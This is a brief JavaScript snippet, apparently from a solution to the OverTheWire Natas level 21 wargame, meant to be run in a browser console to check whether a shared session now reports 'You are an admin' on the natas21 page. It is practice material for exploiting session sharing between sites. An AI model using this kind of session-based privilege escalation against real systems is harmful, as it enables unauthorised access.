//Enter this into the console for the main site. They share same session
url = 'http://natas21.natas.labs.overthewire.org/index.php';
truestring = "You are an admin";

xhr2 = new XMLHttpRequest();
xhr2.open('GET',url,false);
xhr2.onload = function () {
	if (xhr2.responseText.includes(truestring)) {
		console.log(xhr2.responseText);
	}
};
xhr2.send();